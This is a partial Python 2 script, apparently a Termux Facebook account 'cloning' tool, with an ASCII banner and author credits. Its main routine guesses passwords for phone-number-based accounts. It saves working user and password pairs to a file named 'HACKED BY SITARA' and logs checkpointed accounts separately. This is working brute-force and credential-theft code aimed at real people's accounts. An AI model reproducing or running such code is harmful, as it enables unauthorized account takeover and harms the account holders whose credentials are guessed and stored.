...
logo = """
   ...
   _____ _____ _______       _____              _  __
  / ____|_   _|__   __|/\   |  __ \     /\     | |/ /
 | (___   | |    | |  /  \  | |__) |   /  \    | ' / 
  \___ \  | |    | | / /\ \ |  _  /   / /\ \   |  <  
  ____) |_| |_   | |/ ____ \| | \ \  / ____ \  | . \ 
...
--------------------------------------------------
 Author      : Sitara koko kandaHari
 GitHub      : https://github.com/SitaraKoko
 YouTube     : Termux Learner
 Telegram    : Not Available
 Blogspot     : Not Acceseble
--------------------------------------------------
"""
back = 0
successful = []
...
def Sultani():
    ...
    print logo
    print 42 * '~'
    print '  [01] CLONE  ALL Country  WITH NUMBERS '
    print 42 * '~'
    Mohammad()
    ...
    def main(arg):
        ...
        try:
            ...
            if 'access_token' in q:
                ...
                okb = open('save/ HACKED BY SITARA   .txt', 'a')
                okb.write(k + c + user + '   ' + pass1 + '\n')
                okb.close()
                oks.append(c + user + pass1)
            elif 'www.facebook.com' in q['error_msg']:
                print '\x1b[1;92mHACKED BY SITARA\x1b[1;92m ' + k + c + user + '  yes  ' + pass1 + '\n'
            ...
            if 'access_token' in q:
                ...
                print '\x1b[1;92mHACKED BY SITARA\x1b[1;92m ' + k + c + user + '  yes  ' + pass2 + '\n'
                cps = open('save/checkpoint.txt', 'a')
